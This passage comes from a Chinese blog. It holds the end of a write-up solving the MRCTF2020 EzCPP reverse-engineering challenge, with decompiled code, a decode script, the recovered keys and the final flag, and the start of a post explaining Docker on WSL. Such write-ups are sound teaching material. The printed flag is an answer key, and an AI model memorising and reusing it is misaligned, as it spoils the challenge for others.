<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">std::ios_base::Init::<span class="built_in">Init</span>((std::ios_base::Init *)&amp;std::__ioinit);</span><br><span class="line">    __cxa_atexit((<span class="built_in">void</span> (__fastcall *)(<span class="type">void</span> *))&amp;std::ios_base::Init::~Init, &amp;std::__ioinit, &amp;_dso_handle);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v3);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      &amp;ans[abi:cxx11],</span><br><span class="line">      <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line">      &amp;v3);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v3);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v4);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      (<span class="type">char</span> *)&amp;ans[abi:cxx11] + <span class="number">32</span>,</span><br><span class="line">      <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line">      &amp;v4)</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v4);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(</span><br><span class="line">      (<span class="type">char</span> *)&amp;ans[abi:cxx11] + <span class="number">64</span>,</span><br><span class="line">      <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line">      &amp;v5);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>相当于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> ans[<span class="number">9</span>] = &#123;</span><br><span class="line"> <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=zATT&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=s=s=s=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=EOll=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=lE=T=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=EsE=s=z&quot;</span>,</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;=AT=lE=ll&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>于是就得到了ans数组,后面的工作就是从ans数组开始反回去</p>
</blockquote>
<h4 id="departvi-temp"><code>depart(v[i], temp);</code></h4>
<p><code>depart</code>函数干了啥事呢?将<code>v[i]</code>分解质因数,然后按照从大到小的顺序,放到<code>temp</code>字符串里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">depart</span><span class="params">(<span class="type">int</span> a1, <span class="built_in">string</span> &amp;s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; <span class="built_in">sqrt</span>(a1) &gt;= i; ++i) <span class="comment">// i从2根号a1,遍历求a1的乘法因子</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((a1 % i) == <span class="number">0</span>)</span><br><span class="line">        &#123;                      <span class="comment">//当a1%i能够除开则i是a1的除法因子</span></span><br><span class="line">            depart(a1 / i, s); <span class="comment">// a1中去掉刚刚找到的乘法因子i,然后继续寻找剩下的乘法银子</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s = s + <span class="string">&quot; &quot;</span> + to_string(v6); <span class="comment">//由于最深处的递归函数首先执行本行,因此,最大的因子最先添加到a2上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解密脚本">解密脚本</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string ans[<span class="number">11</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;=zqE=z=z=z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=lzzE&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=ll=T=s=s=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=zATT&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=s=s=s=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=EOll=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=lE=T=E=E=E&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=EsE=s=z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;=AT=lE=ll&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(string &amp;str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">length</span>(); ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (str[i])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;5&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;7&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;8&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            str[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">calc</span><span class="params">(<span class="type">const</span> string &amp;str)</span></span>&#123;</span><br><span class="line">    string temp;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;str.<span class="built_in">length</span>();++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            ans*=<span class="built_in">stoi</span>(temp);</span><br><span class="line">            temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            temp+=str[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans*=<span class="built_in">stoi</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">change</span>(ans[i]);</span><br><span class="line">        cout&lt;&lt;(<span class="built_in">calc</span>(ans[i])^<span class="number">1</span>)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\MRCTF2020\EzCPP&gt; ./test</span><br><span class="line"><span class="number">2345</span></span><br><span class="line"><span class="number">1222</span></span><br><span class="line"><span class="number">5774</span></span><br><span class="line"><span class="number">2476</span></span><br><span class="line"><span class="number">3374</span></span><br><span class="line"><span class="number">9032</span></span><br><span class="line"><span class="number">2456</span></span><br><span class="line"><span class="number">3531</span></span><br><span class="line"><span class="number">6720</span></span><br></pre></td></tr></table></figure>
<p>Linux虚拟机或者wsl上运行EasyCPP然后把keys乎进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/MRCTF2020/EzCPP]</span><br><span class="line">└─# ./EasyCPP</span><br><span class="line">give me your key!</span><br><span class="line"><span class="number">2345</span></span><br><span class="line"><span class="number">1222</span></span><br><span class="line"><span class="number">5774</span></span><br><span class="line"><span class="number">2476</span></span><br><span class="line"><span class="number">3374</span></span><br><span class="line"><span class="number">9032</span></span><br><span class="line"><span class="number">2456</span></span><br><span class="line"><span class="number">3531</span></span><br><span class="line"><span class="number">6720</span></span><br><span class="line">right!</span><br><span class="line">flag:MRCTF&#123;md5(<span class="number">234512225774247633749032245635316720</span>)&#125;</span><br><span class="line">md5()-&gt;&#123;<span class="number">32</span>/upper <span class="keyword">case</span>/put the <span class="built_in">string</span> into the function and transform into md5 hash&#125;</span><br><span class="line">sh: <span class="number">1</span>: pause: not found</span><br></pre></td></tr></table></figure>
<p>32位大写的md5加密:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4367F</span>B5F42C6E46B2AF79BF409FB84D3</span><br></pre></td></tr></table></figure>
<p>因此flag是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;4367FB5F42C6E46B2AF79BF409FB84D3&#125;</span><br></pre></td></tr></table></figure>
<p>交到buuctf上是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4367FB5F42C6E46B2AF79BF409FB84D3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="胡思乱想">胡思乱想</h3>
<p>为什么ida会多此一举地创建多个副本呢?</p>
<p>以ida在main函数刚开始时创建的两个vector对象为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;int&gt;::vector(v20, argv, envp);</span><br><span class="line">std::vector&lt;bool&gt;::vector(v19);</span><br></pre></td></tr></table></figure>
<p>显然v20和v19是作为句柄用的,两句话实际上相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;int&gt; v20(argv,envp);</span><br><span class="line">vector&lt;bool&gt; v19;</span><br></pre></td></tr></table></figure>
<p>然而我从来也没有见过传递两个字符串数组指针给vector的构造函数</p>
<blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>():<span class="comment">//创建一个空vector</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">int</span> nSize):<span class="comment">//创建一个vector,元素个数为nSize</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">int</span> nSize,<span class="type">const</span> t&amp; t):<span class="comment">//创建一个vector，元素个数为nSize,且值均为t</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">const</span> vector&amp;):<span class="comment">//复制构造函数</span></span><br><span class="line"><span class="built_in">vector</span>(begin,end)<span class="comment">//:复制[begin,end)区间内另一个数组的元素到vector</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>后面这个<code>vector&lt;bool&gt; v19</code>更离谱,自从创建了它,后面从来没有使用过,在main函数结尾处调用了它的析构函数</p>
<p>为什么会发生这种诡异的情况呢?只能做一个推测</p>
<p>看一下main函数的开端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">push    rbx</span><br><span class="line">sub     rsp, 138h</span><br><span class="line">mov     [rbp+var_14], 0</span><br><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev ; std::vector&lt;int&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_E0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIbSaIbEEC2Ev ; std::vector&lt;bool&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_91]</span><br><span class="line">mov     rdi, rax</span><br></pre></td></tr></table></figure>
<p>本来创建一个vector容器的结构应该是</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev</span><br></pre></td></tr></table></figure>
<p>栈上var_B0应该是句柄的位置,通过rax中转将var_B0的地址放到rdi里,rdi用来传递参数给<code>_ZNSt6vectorIiSaIiEEC2Ev</code></p>
<p>可是这只是交代了vector对象的句柄应该放在哪,并没有指明参数,这意味着只是创建了一个vector<int>对象,没有传递参数</p>
<p>但是ida不认为它没有参数.</p>
<p>他看见前面有两个push压栈,认为是在准备参数,也没管中间还有sub指令导致的栈变化</p>
<p>(因为正常函数调用的时候,准备参数过程中啃腚不会瞎改栈顶指针,可能ida就直接寻找push指令了,根本不管其他指令的事情)</p>
<p>ida认为,在执行<code>call _ZNSt6vectorIiSaIiEEC2Ev</code>时,刚才压栈的push
rbp和push rbx是保存的调用者main函数的寄存器</p>
<p>一下可能是ida在想什么:</p>
<p>rbp是main函数的栈帧指针,它指向的正是<code>main</code>的最后一个参数<code>envp</code></p>
<p>rbx也不知道ida是怎么认为它存放的是<code>argc</code>数组的</p>
<p>反正它就这样认为的,两个push是在为<code>vector</code>准备参数</p>
<p>于是F5反编译的时候他就堂而皇之地写了一个</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;<span class="type">int</span>&gt;::<span class="built_in">vector</span>(v20, argv, envp);</span><br></pre></td></tr></table></figure>
<p>那为啥第二次<code>vector&lt;bool&gt;</code>的时候就没有乱写参数呢?</p>
<p>推测因为ida从最近刚调用函数开始计算当前函数的参数是啥,而两次函数调用之间没有压栈操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call    _ZNSt6vectorIiSaIiEEC2Ev ; std::vector&lt;int&gt;::vector(void)</span><br><span class="line">lea     rax, [rbp+var_E0]</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    _ZNSt6vectorIbSaIbEEC2Ev ; std::vector&lt;bool&gt;::vector(void)</span><br></pre></td></tr></table></figure>
<p>因此ida认为后来这个vector是无参的</p>
<blockquote>
<p>看雪论坛上大佬的解释是</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220727213433217.png"
alt="image-20220727213433217" />
<figcaption aria-hidden="true">image-20220727213433217</figcaption>
</figure>
<p>我猜ida有时判断不准要几个参数,有可能是调用者和被调用者的调用约定不同,比如cdecl的main函数调用thiscall的构造函数.</p>
<p>学了堆栈平衡再回来看吧</p>
</blockquote>
<p>那为啥有一个<code>vector&lt;bool&gt;</code>后来却从来不用他?</p>
<p>从反汇编得到的指令来看,确实是有调用<code>vector&lt;bool&gt;</code>的构造函数的,可能是出题的为了混淆视听吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/24/Docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/24/Docker/" class="post-title-link" itemprop="url">Docker@wsl</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-24 22:33:00" itemprop="dateCreated datePublished" datetime="2022-07-24T22:33:00+08:00">2022-07-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-16 22:46:10" itemprop="dateModified" datetime="2023-10-16T22:46:10+08:00">2023-10-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="dockerwsl">Docker@wsl</h1>
<h2 id="docker是什么">docker是什么?</h2>
<p>docker相对于虚拟机是更新一代的虚拟化技术</p>
<p><a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/487824422">Docker和虚拟机的区别？ -
知乎 (zhihu.com)</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-9e4980b5c77243ed64760574cd3cdfb9_1440w.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>基础设施就是笔记本电脑</p>
<p>主操作系统就是windows11</p>
<p>Hypervisor虚拟机管理系统比如windows的Hyper-V,还有VMWare,VritualBox等等</p>
<p>从操作系统就是虚拟机,比如VMWare上的windows server
2003,又如Hyper-V上的WSL.</p>
<p>每个从操作系统都占有独立的内存,CPU等硬件资源.这体现在VMware虚拟机或者WSL运行前可以设置使用CPU数量,内存大小等待</p>
<p>在Docker中,Docker守护进程取代了虚拟机管理类系统,docker是运行在操作系统之上的后台进程,管理docker容器</p>
<p>所有Docker容器都经过Docker守护进程使用CPU,内存等硬件资源.而守护进程是主操作系统的一个后台进程,受主操作系统的调度.</p>
<p>简单的说,docker就是更先进的更轻量级的虚拟技术?</p>
<h3 id="docker四个核心组件">docker四个核心组件</h3>
<p>docker的四个核心组件:</p>
<p>客户端与服务器</p>
<p>镜像</p>
<p>仓库</p>
<p>容器</p>
<h4 id="cs体系">C/S体系</h4>
<p>docker可以作为工作站使用,也可以作为客户端使用.</p>
<p>就是计网中的C/S模型</p>
<h4 id="docker镜像">docker镜像</h4>
<p>"一个docker镜像可以包含一个完整的ubuntu操作系统环境,里面仅安装了Apache或用户需要的其他应用程序"</p>
<p>可以类比.exe文件,exe在磁盘中躺着的时候,就是一个文件.但是加载进入内存之后就成了进程映像.</p>
<p>docker镜像和.exe文件一个性质,而docker容器和进程映像一个性质</p>
<p>docker镜像是只读的,这好理解,就好比一个已经编译链接生成的.exe文件也是只读的一个道理.因为它就没有被改变的理由.如果要"修改"docker镜像,只能是重新生成或者制作</p>
<h4 id="docker容器">docker容器</h4>
<p>容器是从镜像创建的运行实例.</p>
<p>镜像是一个静态概念,而容器就是一个动态概念</p>
<table>
<thead>
<tr>
<th>docker中的概念</th>
<th>目标文件中的概念</th>
</tr>
</thead>
<tbody>
<tr>
<td>docker镜像</td>
<td>文件系统中的.exe文件</td>
</tr>
<tr>
<td>docker容器</td>
<td>内存中的进程映像</td>
</tr>
</tbody>
</table>
<p>到此不禁要考虑一个问题,如果本次在docker容器中写了一个test.txt文件并保存,</p>
<p>关机之后,下次再启动这个docker容器,这个test.txt还存在吗?如果存在,显然是保存在了磁盘中,保存在那里了?docker镜像中吗?还是主操作系统中?</p>
<p>如果导出这个容器,制作一个新镜像,然后新镜像导入成其他电脑的docker容器,那么这个容器中还有test.txt吗?</p>
<p>实际上docker在镜像上面还有一可写入层,镜像被多个容器共用,每个容器创建后私自的改动写入自己的可写入层</p>
<h4 id="docker仓库">docker仓库</h4>
<p>集中存放docker镜像文件的地方</p>
<blockquote>
<p>仓库的概念可以类比git,有本地的git仓库,也有远程的公共仓库服务器github,gitee</p>
<table>
<thead>
<tr>
<th>docker概念</th>
<th>git概念</th>
</tr>
</thead>
<tbody>
<tr>
<td>docker镜像</td>
<td>仓库中的文件</td>
</tr>
<tr>
<td>docker本地仓库</td>
<td>git本地仓库</td>
</tr>
<tr>
<td>docker远程仓库</td>
<td>github中的仓库</td>
</tr>
<tr>
<td>docker注册仓库服务器</td>
<td>github</td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="四组件关系">四组件关系</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220722201232759.png"
alt="image-20220722201232759" />
<figcaption aria-hidden="true">image-20220722201232759</figcaption>
</figure>
<p>现阶段用不到Dockerfile,甚至Docker仓库也只是白嫖一下官方的镜像,上传什么的以后再说</p>
<h2 id="wsl上使用docker">wsl上使用docker</h2>
<p>ubuntu wsl上的docker安装见</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/lupengfei1009/article/details/94637398">window10下子系统ubuntu安装Docker</a></p>
<h3 id="换docker下载源">换docker下载源</h3>
<p>在使用docker之前,先把下载源换成国内源,会方便很多</p>
<p>如果梯子流量管够并且梯子够快,当然不用换下载源.</p>
<p>这里换元不是指wsl的apt命令下载源,也不是指docker中容器的apt命令下载源.</p>
<p>而是<strong>指docker从哪里拉取镜像</strong></p>
<p>在wsl中<code>vim /etc/docker/daemon.json</code></p>
<p>然后添加下载源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://ustc-edu-cn.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;https://ghcr.io&quot;,</span><br><span class="line">    &quot;https://mirror.baidubce.com&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存后重启docker服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker restart</span><br></pre></td></tr></table></figure>
